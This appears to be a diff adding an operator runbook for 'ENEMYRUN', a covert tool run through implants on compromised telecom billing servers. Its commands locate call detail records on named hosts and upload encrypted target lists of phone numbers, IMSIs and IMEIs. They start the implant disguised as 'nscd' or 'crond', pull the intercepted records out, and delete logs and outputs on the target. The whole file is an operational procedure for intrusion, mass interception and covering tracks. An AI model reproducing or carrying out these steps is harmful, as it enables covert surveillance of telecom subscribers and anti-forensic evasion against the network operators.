@@ -1,0 +1,635 @@
+##################
+#### ENEMYRUN ####
+##################
+
+## copy and paste this into the window if you want syntax highlighting:
+## it makes scripts a bit easier to read
+
+:syntax on
+
+
+##############
+## ER SETUP ##
+##############
+
+##
+## only get an encryption key value, if you don't already have one, ask first
+##
+#md5sum /current/down/tcpdump.raw
+
+##
+## vi Search/Replace commands:
+## projectName 	- self explanatory, all CAPS
+## date field 	- today's date, used for output files
+## hostname.ip 	- hostname of the box and IP address exactly as displayed in nopen window title bar
+##		  or as seen in /current/down
+## cryptkey 	- encryption key (already have one, or use output from below md5sum command)
+## 
+
+mx
+:%s/PROJECTNAME/PROJECTNAME/g
+:%s/DDMonYY/DDMonYY/g
+:%s/HOSTNAME.IP/HOSTNAME.IP/g
+:%s/CRYPTKEY/CRYPTKEY/g
+'x
+
+
+##
+## copy the ER directory "er_PROJECTNAME" from the project's /targets/<proj_name>/sustained directory 
+## to /current/down and make sure there are no tarballs in /current/down
+##
+
+mz
+cp -r /mnt/zip/er_PROJECTNAME /current/down
+cd /current/down/er_PROJECTNAME
+uz
+
+##
+## save the encryption key locally in /current/down
+## whether you have a new or old key:
+##
+
+echo CRYPTKEY > /current/down/cryptkey.enemyrun.DDMonYY
+
+## copy key to ER directory if creating a new key
+
+echo CRYPTKEY > /current/down/er_PROJECTNAME/cryptkey.enemyrun.DDMonYY
+
+
+##
+## implant hidden directory for script commnads
+## location is implant dependent
+## 	INCISION:
+## 	  Solaris - /platform/SUNW,SystemEngine/kernel/drv
+##	  Linux - (hidden independently; should be on plan, or check old opnotes)
+## 	STOICSURGEON: (hidden directory is displayed at beginning of FTSHELL/ish callback)
+## no trailing /
+##
+
+mx
+:%s:IMPLANT_HIDDEN_DIRECTORY:IMPLANT_HIDDEN_DIRECTORY:g
+'x
+
+##
+## prepare files containing numbers to search for:
+## if files containing the numbers to search available:
+##
+
+mkdir /current/down/argfiles
+cd /current/down/argfiles
+mz
+cp /mnt/zip*/PROJECTNAME/arg* /current/down/argfiles
+ls -altr
+
+##
+## prep the argfiles:
+## make sure the files are ASCII and contain NO EMPTY LINES!!
+## make sure the last line does not contain a null character at the end
+##     (vi the file, add a carriage return to the last line, then delete the empty
+##     line and save)
+## "file" results:
+##     this will not work: ASCII text, with CRLF line terminators
+##     this WILL:          ASCII text
+##
+
+cat arg*
+file arg*
+dos2unix arg*
+file arg*
+
+##
+## if no data media is provided:
+## locally, create a file of numbers to grep for with each number on a separate line
+##       make sure there are NO EMPTY LINES!!!!
+## Format of each type of argument:
+## p123456789 - phone number
+## s123456789 - IMSI
+## e123456789 - IMEI
+## c123/456   - Cell/LAC (no leading 0's)
+##
+
+cd /current/down/argfiles
+vim /current/down/argfiles/argfile1.txt
+
+##
+## encrypt argfiles / target files
+##
+
+## encrypt the ascii list...first make sure you have the encryption tool:
+
+which cryptTool.v1.0.Linux2.4.18-14.targetdl
+
+
+## if cryptTool not in PATH, change your PATH or insert full path in command
+## to encrypt one at a time...skip to next comment to encrypt all at once:
+
+cryptTool.v1.0.Linux2.4.18-14.targetdl -i argfile1.txt -o argfile1.enc -k CRYPTKEY -b
+cryptTool.v1.0.Linux2.4.18-14.targetdl -i argfile2.txt -o argfile2.enc -k CRYPTKEY -b
+
+## to encrypt all at the same time:
+
+for i in argfile* ; do cryptTool.v1.0.Linux2.4.18-14.targetdl -i $i -o `basename $i .txt`.enc -k CRYPTKEY -b ; done
+
+ls -l
+file argfile*.enc
+
+
+##
+## on target look at CDR directories:
+## - use the following commands to determine the location of current CDR data storage
+## - once you identify the location of the data, you'll use the head/tail commands 
+## to determine the date ranges being saved
+## - these date ranges will be used as settings in the ER configuration file(s)
+##
+
+##
+## typical file locations per host:
+##
+
+######################### aromaseal:
+
+
+######################### desertvista:
+
+-lt /var/archive/output_billing
+-vget /var/archive/output_billing/MoveData.sh 
+
+
+######################### diamondaxe:
+
+
+########################## editionhaze:
+## billing02  10.100.10.140
+ls -latr /d08/saba/CDR/out/MS* | head -10
+ls -latr /d08/saba/CDR/out/MS* | tail -10
+ls -latr /d08/saba/CDR/out/MS* | wc -l
+
+
+########################## liquidsteel:
+
+
+########################## serenecosmos:
+
+ls -latr /var/opt/archive/tape/*/*_S_*.gz | head -10
+ls -latr /var/opt/archive/tape/*/*_S_*.gz | tail -10
+
+
+########################## sicklestar:
+
+## magnum: CURSEHAPPY not working on all SS .usd files :-(
+## Try these first, should be all of them in one spot
+ls -latr /usd_archive/mc_storage/*usd | head -10
+ls -latr /usd_archive/mc_storage/*usd | tail -10
+
+## if none in previous ones...
+ls -latr /sys1/var/billing/out_coll/*usd | head -10
+ls -latr /sys1/var/billing/out_coll/*usd | tail -10
+ls -latr /sys1/var/alcatel/out_coll/*usd | head -10
+ls -latr /sys1/var/alcatel/out_coll/*usd | tail -10
+
+ls -latr /sys1/var/billing/msc_is2 | tail -20
+
+
+######################### qualitygel:
+
+
+########################## wholeblue:
+## tpmw01  10.3.4.55
+## tpmw02  10.3.4.56
+
+## verifies isb, khi, and lhr directories:
+ls -ld /tp/med/datastore/collect/siemens_msc_*
+ls -ld /tp/med/datastore/collect/siemens_msc_*/.tmp_ncr
+ls -ld /tp/med/archive/collect/siemens_msc_*
+ls -ld /tp/med/archive/collect/siemens_msc_*/.tmp_ncr
+
+## shows oldest and newest files in directories:
+ls -latr /tp/med/datastore/collect/*isb*/*.MSC | head -10
+ls -latr /tp/med/datastore/collect/*isb*/*.MSC | tail -10
+ls -latr /tp/med/datastore/collect/*khi*/*.MSC | head -10
+ls -latr /tp/med/datastore/collect/*khi*/*.MSC | tail -10
+ls -latr /tp/med/datastore/collect/*lhr*/*.MSC | head -10
+ls -latr /tp/med/datastore/collect/*lhr*/*.MSC | tail -10
+
+ls -latr /tp/med/datastore/collect/*isb*/.tmp_ncr/*.MSC | head -10
+ls -latr /tp/med/datastore/collect/*isb*/.tmp_ncr/*.MSC | tail -10
+ls -latr /tp/med/datastore/collect/*khi*/.tmp_ncr/*.MSC | head -10
+ls -latr /tp/med/datastore/collect/*khi*/.tmp_ncr/*.MSC | tail -10
+ls -latr /tp/med/datastore/collect/*lhr*/.tmp_ncr/*.MSC | head -10
+ls -latr /tp/med/datastore/collect/*lhr*/.tmp_ncr/*.MSC | tail -10
+
+ls -latr /tp/med/archive/collect/siemens_msc_isb01/*.MSC | head -10
+ls -latr /tp/med/archive/collect/siemens_msc_isb01/*.MSC | tail -10
+ls -latr /tp/med/archive/collect/siemens_msc_khi01/*.MSC | head -10
+ls -latr /tp/med/archive/collect/siemens_msc_khi01/*.MSC | tail -10
+ls -latr /tp/med/archive/collect/siemens_msc_lhr01/*.MSC | head -10
+ls -latr /tp/med/archive/collect/siemens_msc_lhr01/*.MSC | tail -10
+
+ls -latr /tp/med/archive/collect/siemens_msc_isb01/.tmp_ncr/*.MSC | head -10
+ls -latr /tp/med/archive/collect/siemens_msc_isb01/.tmp_ncr/*.MSC | tail -10
+ls -latr /tp/med/archive/collect/siemens_msc_khi01/.tmp_ncr/*.MSC | head -10
+ls -latr /tp/med/archive/collect/siemens_msc_khi01/.tmp_ncr/*.MSC | tail -10
+ls -latr /tp/med/archive/collect/siemens_msc_lhr01/.tmp_ncr/*.MSC | head -10
+ls -latr /tp/med/archive/collect/siemens_msc_lhr01/.tmp_ncr/*.MSC | tail -10
+
+##  isbapro1 10.5.7.51
+## nothing new
+-lt /u01/product_evdp/evident/data_store/collect
+ls -latr /u01/product_evdp/evident/data_store/collect/siemens_msc | head -10
+ls -latr /u01/product_evdp/evident/data_store/collect/siemens_msc | tail -10
+ls -latr /u01/product_evdp/evident/data_store/collect/siemens_msc_khi01 | head -10
+ls -latr /u01/product_evdp/evident/data_store/collect/siemens_msc_khi01 | tail -10
+ls -latr /u01/product_evdp/evident/data_store/collect/siemens_msc_isb01 | head -10
+ls -latr /u01/product_evdp/evident/data_store/collect/siemens_msc_isb01 | tail -10
+ls -latr /u01/product_evdp/evident/data_store/collect/siemens_msc_lhr01 | head -10
+ls -latr /u01/product_evdp/evident/data_store/collect/siemens_msc_lhr01 | tail -10
+
+-lt /u03/archive/collect
+## newer stuff
+ls -latr /u03/archive/collect/siemens_msc_isb01 | head -10
+ls -latr /u03/archive/collect/siemens_msc_isb01 | tail -10
+ls -latr /u03/archive/collect/siemens_msc_isb01 | wc -l
+## old stuff:
+ls -latr /u03/archive/collect/siemens_msc_khi01 | head -10
+ls -latr /u03/archive/collect/siemens_msc_khi01 | tail -10
+
+
+#############
+## COLLECT ##
+#############
+
+##
+## cd to hidden directory where ENEMYRUN is set up
+## when in the hidden directory, there could be two subdirectories; 
+## one for a forward instance and one backward (e.g. erf and erb)
+##
+
+-cd IMPLANT_HIDDEN_DIRECTORY
+
+##
+## there should be files in:
+##   er*/aux_*/output/final 
+## and possibly if parsing is occuring:
+##   er*/aux_*/output
+##
+
+-ls -R er*
+
+-ls -R IMPLANT_HIDDEN_DIRECTORY/er*
+
+##
+## stop current instances on ENEMYRUN
+## need name of process ENEMYRUN is running as on target; should be on plan, or check old opnotes
+## ER_PROCESS_NAME: name under which ENEMYRUN is running on target; try nscd which will look like ./nscd
+##
+
+#ps -ef | grep ENEMYRUN_PROCESS_NAME
+ps -ef | grep nscd
+
+## kill with SIGTERM; if it doesn't work use kill -9
+## ENEMYRUN_PID: process id under which ENEMYRUN is running on target
+
+kill -15 ENEMYRUN_PID
+
+##
+## collect parsed CDRs and logs created from the backward directory
+## files are encrypted
+##
+
+-get IMPLANT_HIDDEN_DIRECTORY/er*/aux_*/output/final/*
+
+-get IMPLANT_HIDDEN_DIRECTORY/er*/logs/final/log*
+
+## in a local window make sure you have them all:
+ls -laR /current/down/HOSTNAME.IPIMPLANT_HIDDEN_DIRECTORY/er*
+
+
+##
+## clean ER directories
+##
+
+## remove parsed CDRs
+
+rm -fr IMPLANT_HIDDEN_DIRECTORY/er*/aux_*/output/final/*
+
+## remove old logs
+
+rm -f IMPLANT_HIDDEN_DIRECTORY/er*/logs/final/log*
+
+## remove the status.log file >>>ONLY<<< from the >>>BACKWARDS<<< directory
+
+rm -f IMPLANT_HIDDEN_DIRECTORY/erb/status.log
+
+-ls -R er*
+
+-ls -R IMPLANT_HIDDEN_DIRECTORY/er*
+
+
+##
+## edit ER configuration files
+##
+
+## in a local window
+
+cd /current/down/er_PROJECTNAME
+
+## find ER configs
+
+ls -la er_conf*.txt
+
+## should usually not have to edit the forward config, er_conf_fwd*.txt
+## edit the backwards config, er_conf_bwd*.txt
+
+vi er_conf_bwd.txt
+
+## probably have to change START_DAY and STOP_DAY
+## START_DAY:  YYYYMMDD # day backwards in time from which to start
+## STOP_DAY:   YYYYMMDD # day forwards from START_DAY: to stop
+## make sure you've made date range changes, or any other changes, 
+## to the plaintext ER configuration files and save
+
+
+##
+## encrypt required ER files
+##
+
+## encrypt the ER backwards configuration file
+
+cd /current/down/er_PROJECTNAME
+
+cryptTool.v1.0.Linux2.4.18-14.targetdl -i /current/down/er_PROJECTNAME/er_conf_bwd.txt -o /current/down/er_PROJECTNAME/er_conf_bwd.enc -k CRYPTKEY -b
+
+## encrypt the ER forwards configuration file
+
+cryptTool.v1.0.Linux2.4.18-14.targetdl -i /current/down/er_PROJECTNAME/er_conf_fwd.txt -o /current/down/er_PROJECTNAME/er_conf_fwd.enc -k CRYPTKEY -b
+
+file /current/down/er_PROJECTNAME/er_conf_*.enc
+
+
+## --------------- ##
+## BACKWARDS FILES ##
+## --------------- ##
+
+##
+## put up encrypted files
+##
+
+## encrypted argfile(s)
+
+-put /current/down/argfiles/argfile1.enc IMPLANT_HIDDEN_DIRECTORY/erb/adm1
+
+## copy adm1 for each aux_* directory you see
+## e.g. if you see aux_1 aux_2 aux_3 then:
+## cp adm1 adm2
+## cp adm1 adm3
+
+## encrypted ER configuration file
+
+-put /current/down/er_PROJECTNAME/er_conf_bwd.enc IMPLANT_HIDDEN_DIRECTORY/erb/ecb
+
+##
+## start ENEMYRUN
+## may not work w/ PATH=.
+## CRYPTKEY must be the same as in the ER configuration file 
+##
+
+-cd IMPLANT_HIDDEN_DIRECTORY/erb
+
+L='-I ecb -k CRYPTKEY'; export L; ./nscd
+
+#ps -ef | grep ENEMYRUN_PROCESS_NAME
+ps -ef | grep nscd
+
+## record ER process pid(s) in opnotes
+## DDMonYY
+## backward ENEMYRUN_PROCESS_NAME
+## pid: 
+
+ps -ef | grep ENEMYRUN_PID
+
+## the argfile(s) should no longer be in the erb directory after ER is running
+## if the parser has started, these files should grow
+## logs IMPLANT_HIDDEN_DIRECTORY/erb/aux_1/output/<prefix>Log.*
+## hits IMPLANT_HIDDEN_DIRECTORY/erb/aux_1/output/<prefix>.*
+
+-ls -R erb
+
+-ls -R IMPLANT_HIDDEN_DIRECTORY/erb
+
+
+## -------------- ##
+## FORWARDS FILES ##
+## -------------- ##
+
+##
+## put up encrypted files
+##
+
+## encrypted argfile(s)
+
+-put /current/down/argfiles/argfile1.enc IMPLANT_HIDDEN_DIRECTORY/erf/adm1
+
+	## or
+
+-put /current/down/argfiles/argfile_forward.enc IMPLANT_HIDDEN_DIRECTORY/erf/adm1
+
+## copy adm1 for each aux_* directory you see
+## e.g. if you see aux_1 aux_2 aux_3 then:
+## cp adm1 adm2
+## cp adm1 adm3
+
+## encrypted ER configuration file
+
+-put /current/down/er_PROJECTNAME/er_conf_fwd.enc IMPLANT_HIDDEN_DIRECTORY/erf/ecf
+
+##
+## start ENEMYRUN
+## may not work w/ PATH=.
+## CRYPTKEY must be the same as in the ER configuration file 
+##
+
+-cd IMPLANT_HIDDEN_DIRECTORY/erf
+
+L='-I ecf -k CRYPTKEY'; export L; ./nscd
+
+#ps -ef | grep ENEMYRUN_PROCESS_NAME
+ps -ef | grep nscd
+
+## record ER process pid(s) in opnotes
+## DDMonYY
+## forward ENEMYRUN_PROCESS_NAME
+## pid: ER_PID
+
+ps -ef | grep ENEMYRUN_PID
+
+## the argfile(s) should no longer be in the erb directory after ER is running
+## if the parser has started, these files should grow
+## logs IMPLANT_HIDDEN_DIRECTORY/erf/aux_1/output/<prefix>Log.*
+## hits IMPLANT_HIDDEN_DIRECTORY/erf/aux_1/output/<prefix>.*
+
+-ls -R erf
+
+-ls -R IMPLANT_HIDDEN_DIRECTORY/erf
+
+##
+## once all required ER instances are running, you're done
+##
+
+-cd /tmp
+-burnBURN
+
+
+##
+## decrypt parsed CDRs locally
+##
+
+## single aux* directory
+
+cd /current/down/HOSTNAME.IPIMPLANT_HIDDEN_DIRECTORY/erb
+	## and/or
+cd /current/down/HOSTNAME.IPIMPLANT_HIDDEN_DIRECTORY/erf/aux_1/output/final
+
+for i in * ; do cryptTool.v1.0.Linux2.4.18-14.targetdl -i $i -o `basename $i`.txt -k CRYPTKEY -d -c -b ; done
+
+## multiple aux* directories
+
+mkdir /current/down/coll
+cp /current/down/HOSTNAME.IPIMPLANT_HIDDEN_DIRECTORY/er*/aux*/output/final/* /current/down/coll
+cd /current/down/coll
+
+for i in * ; do cryptTool.v1.0.Linux2.4.18-14.targetdl -i $i -o `basename $i`.txt -k CRYPTKEY -d -c -b ; done
+
+
+##
+## copy decrypted data to media / remove ER tar from /current/down
+##
+
+ls -la *.txt
+mz
+cp *.txt /mnt/zip*/PROJECTNAME
+ls -la /mnt/zip*/PROJECTNAME
+uz
+rm /current/down/er_*.tar
+
+
+############
+## DEPLOY ##
+############
+
+##
+## edit ER configuration files
+##
+
+## in a local window
+
+cd /current/down/er_PROJECTNAME
+
+## find ER configs
+
+ls -la er_conf*.txt
+
+## should not have to edit the forward config, er_conf_fwd*.txt
+## edit the backwards config, er_conf_bwd*.txt
+
+vi er_conf_bwd.txt
+
+## make sure you've made date range changes, or any other changes,
+## to the plaintext ER configuration files
+
+
+##
+## encrypt required ER files
+##
+
+## encrypt the ER backwards configuration file
+
+cd /current/down/er_PROJECTNAME
+
+cryptTool.v1.0.Linux2.4.18-14.targetdl -i /current/down/er_PROJECTNAME/er_conf_bwd.txt -o /current/down/er_PROJECTNAME/er_conf_bwd.enc -k CRYPTKEY -b
+
+## encrypt the ER forwards configuration file
+
+cryptTool.v1.0.Linux2.4.18-14.targetdl -i /current/down/er_PROJECTNAME/er_conf_fwd.txt -o /current/down/er_PROJECTNAME/er_conf_fwd.enc -k CRYPTKEY -b
+
+file /current/down/er_PROJECTNAME/er_conf_*.enc
+
+## encrypt CURSEHAPPY definition file if using CURSEHAPPY
+
+for i in /current/up/cursedefs/*.def ; do cryptTool.v1.0.Linux2.4.18-14.targetdl -i $i -o /current/up/cursedefs/`basename $i .def`.enc -k CRYPTKEY -b ; done
+
+ls -la
+file /current/up/cursedefs/*.enc
+
+##
+## put up directories and tools only if deploying ENEMYRUN
+## this means only put up these files/tools if they are not on the target yet
+## if you have the least doubt about what you're doing, find someone who knows
+##
+
+## --------------- ##
+## BACKWARDS FILES ##
+## --------------- ##
+
+-put /current/down/er_PROJECTNAME/erb_dirs.tar IMPLANT_HIDDEN_DIRECTORY/erb.tar
+tar xvf erb.tar
+
+-cd IMPLANT_HIDDEN_DIRECTORY/erb
+
+-ls -R
+
+## put up applicable parser(s)
+-put /current/up/skimcountry.v1.2.SunOS5.9.targetdl IMPLANT_HIDDEN_DIRECTORY/erb/crond 
+-put /current/up/cursehappy4 IMPLANT_HIDDEN_DIRECTORY/erb/crond
+-put /current/up/orleansstride.v2.3.0.0.SunOS5.8.targetdl IMPLANT_HIDDEN_DIRECTORY/erb/crond
+-put /current/up/cursemagic.v1.0.0.0.SunOS5.8.targetdl IMPLANT_HIDDEN_DIRECTORY/erb/crond
+-put /current/up/cursegismo.v1.1.0.4.SunOS5.8.targetdl IMPLANT_HIDDEN_DIRECTORY/erb/crond
+
+## encrypted CURSEHAPPY definition file
+
+-put /current/up/cursedefs/PROJECTNAME.enc IMPLANT_HIDDEN_DIRECTORY/erb/cd
+
+## put up enemyrun
+
+-put /current/up/enemyrun.v2.3.1.3.SunOS5.8.targetdl IMPLANT_HIDDEN_DIRECTORY/erb/nscd
+
+## if everything looks good remove tar
+
+-rm IMPLANT_HIDDEN_DIRECTORY/erb.tar
+
+
+## -------------- ##
+## FORWARDS FILES ##
+## -------------- ##
+
+-put /current/down/er_PROJECTNAME/erf_dirs.tar IMPLANT_HIDDEN_DIRECTORY/erf.tar
+tar xvf erf.tar
+
+-cd IMPLANT_HIDDEN_DIRECTORY/erf
+
+-ls -R
+
+## put up applicable parser(s)
+-put /current/up/skimcountry.v1.2.SunOS5.9.targetdl IMPLANT_HIDDEN_DIRECTORY/erf/crond 
+-put /current/up/cursehappy4 IMPLANT_HIDDEN_DIRECTORY/erf/crond
+-put /current/up/orleansstride.v2.3.0.0.SunOS5.8.targetdl IMPLANT_HIDDEN_DIRECTORY/erf/crond
+-put /current/up/cursemagic.v1.0.0.0.SunOS5.8.targetdl IMPLANT_HIDDEN_DIRECTORY/erf/crond
+-put /current/up/cursegismo.v1.1.0.4.SunOS5.8.targetdl IMPLANT_HIDDEN_DIRECTORY/erf/crond
+
+## encrypted CURSEHAPPY definition file
+
+-put /current/up/cursedefs/PROJECTNAME.enc IMPLANT_HIDDEN_DIRECTORY/erf/cd
+
+## put up enemyrun
+
+-put /current/up/enemyrun.v2.3.1.3.SunOS5.8.targetdl IMPLANT_HIDDEN_DIRECTORY/erf/nscd
+
+## if everything looks good remove tar
+
+-rm IMPLANT_HIDDEN_DIRECTORY/erf.tar
+
+##
+## to continue the setup process go to the COLLECT section item titled:
+## "edit ER configuration files"
+##
+
+
